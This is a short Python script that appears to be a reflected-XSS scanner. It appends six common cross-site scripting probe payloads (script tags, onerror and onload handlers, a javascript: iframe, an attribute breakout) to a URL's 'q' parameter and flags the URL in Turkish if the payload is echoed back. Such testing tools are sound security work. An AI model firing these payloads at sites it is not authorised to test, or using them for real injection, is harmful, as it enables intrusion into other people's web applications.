import requests

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>", "<iframe src='javascript:alert(1)'>",
    "<body onload=alert(1)>", "' onfocus=alert(1) autofocus='"
]

def test_xss(url):
    vulnerabilities = []
    for payload in XSS_PAYLOADS:
        test_url = f"{url}?q={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                vulnerabilities.append(f"⚠️ Reflected XSS Açığı Tespit Edildi: {test_url}")
        except requests.RequestException:
            continue
    return vulnerabilities
